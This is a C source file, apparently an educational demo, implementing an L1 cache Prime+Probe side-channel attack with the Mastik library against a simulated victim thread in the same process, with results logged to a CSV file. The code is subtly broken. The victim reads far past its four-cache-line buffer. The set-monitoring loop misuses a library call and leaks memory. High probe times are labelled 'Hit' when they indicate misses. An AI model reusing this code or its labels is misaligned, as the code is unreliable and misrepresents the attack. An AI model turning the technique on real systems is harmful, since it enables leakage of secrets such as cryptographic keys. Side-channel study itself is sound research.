/*
 * This piece of code is written by Shahzaib Kashif (github:@shahzaibk23)
 *
 * This code is an advanced implementation of the Prime+Probe attack
 * using the Mastik (https://github.com/0xADE1A1DE/Mastik) library, 
 * designed to simulate a real-world scenario. It demonstrates how 
 * to monitor multiple cache sets in the L1 data cache and analyze 
 * access times to infer victim activity, such as cryptographic operations, 
 * by detecting cache set conflicts.
 *
 * The code initializes the Prime+Probe structure, monitors all L1 cache
 * sets (or a subset), and uses a victim thread to simulate irregular memory
 * accesses that map to specific cache sets. It performs repeated probing
 * to collect access times, saves results to a CSV file for analysis, and
 * prints whether each probe indicates victim activity (high access time)
 * or no activity (low access time) based on a threshold value.
 *
 * The code includes error handling for initialization, monitoring,
 * thread creation, and memory allocation failures. It cleans up by
 * freeing resources and releasing the Prime+Probe structure.
 *
 * Note: This code is for educational purposes.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <mastik/l1.h>
#include <mastik/low.h>

#define MAX_SAMPLES     1000
#define SLOT_TIME       1000    // 1000 cycles for probing interval
#define MONITOR_SETS    64      // Monitor all L1 cache sets
#define THRESHOLD       200     // Approximate threshold for L1 cache miss (cycles)
#define CACHE_LINE_SIZE 64      // Standard cache line size

// Victim thread: Simulates sporadic memory accesses to specific cache sets
void* victim_thread(void* arg) {
    // Allocate a buffer with multiple cache lines
    char* data = aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE * 4);
    if (!data) {
        fprintf(stderr, "Victim: Failed to allocate data buffer\n");
        return NULL;
    }

    // Simulate accessing data in cache sets (e.g., sets 0, 16, 32, 48)
    for (int i = 0; i < 20; i++) {
        usleep(rand() % 500000);                // Random delay between 0-500ms
                                                // Access specific cache lines to cause contention
        volatile char x = data[0];              // Set 0
        x += data[CACHE_LINE_SIZE];             // Set 1 or nearby
        x += data[16 * CACHE_LINE_SIZE];        // Set 16
        x += data[32 * CACHE_LINE_SIZE];        // Set 32
        (void)x;                                // Prevent optimization
    }

    free(data);
    return NULL;
}

int main() {
    // Initialize Prime+Probe structure for L1
    l1pp_t l1 = l1_prepare(NULL);
    if (!l1) {
        fprintf(stderr, "Failed to initialize Prime+Probe structure\n");
        return 1;
    }

    // Monitor multiple cache sets (0 to MONITOR_SETS-1)
    for (int i = 0; i < MONITOR_SETS; i++) {
        int nsets = l1_getmonitoredset(l1, NULL, i);
        int *map = calloc(nsets, sizeof(int));
        if (!l1_getmonitoredset(l1, map, nsets)) {
            fprintf(stderr, "Failed to monitor cache set %d\n", i);
            l1_release(l1);
            return 1;
        }
    }
    printf("Monitoring %d L1 cache sets\n", MONITOR_SETS);

    // Allocate buffer for results with extra space
    size_t results_size = MAX_SAMPLES * MONITOR_SETS * 2;       // Double size for safety
    uint16_t *results = calloc(results_size, sizeof(uint16_t));
    if (!results) {
        fprintf(stderr, "Failed to allocate memory for results\n");
        l1_release(l1);
        return 1;
    }

    // Open CSV file for results
    FILE *fp = fopen("prime_probe_results.csv", "w");
    if (!fp) {
        fprintf(stderr, "Failed to open prime_probe_results.csv\n");
        free(results);
        l1_release(l1);
        return 1;
    }
    fprintf(fp, "Sample");
    for (int i = 0; i < MONITOR_SETS; i++) {
        fprintf(fp, ",Set%d", i);
    }
    fprintf(fp, "\n");

    // Start victim thread
    pthread_t victim;
    if (pthread_create(&victim, NULL, victim_thread, NULL)) {
        fprintf(stderr, "Failed to create victim thread\n");
        fclose(fp);
        free(results);
        l1_release(l1);
        return 1;
    }

    // Perform repeated Prime+Probe
    printf("Starting Prime+Probe...\n");
    int count = l1_repeatedprobe(l1, MAX_SAMPLES, results, SLOT_TIME);
    if (count <= 0 || count > MAX_SAMPLES) {
        fprintf(stderr, "l1_repeatedprobe failed or returned invalid count: %d\n", count);
        fclose(fp);
        free(results);
        l1_release(l1);
        pthread_join(victim, NULL);
        return 1;
    }
    printf("Completed %d samples\n", count);

    // Analyze and print results
    for (int i = 0; i < count; i++) {
        int active = 0;
        fprintf(fp, "%d", i);
        printf("Sample %4d: ", i);
        for (int j = 0; j < MONITOR_SETS; j++) {
            uint16_t access_time = results[i * MONITOR_SETS + j];
            if (access_time == 0) {
                printf("S%d:Invalid ", j);
                fprintf(fp, ",0");
                continue;
            }
            printf("S%d:%4u(%s) ", j, access_time, access_time > THRESHOLD ? "Hit" : "Miss");
            fprintf(fp, ",%u", access_time);
            if (access_time > THRESHOLD) active = 1;
        }
        printf("| %s\n", active ? "Active" : "Idle");
        fprintf(fp, "\n");
    }

    // Cleanup
    fclose(fp);
    printf("Freeing results buffer\n");
    free(results);
    printf("Releasing Prime+Probe structure\n");
    l1_release(l1);
    pthread_join(victim, NULL);
    return 0;
}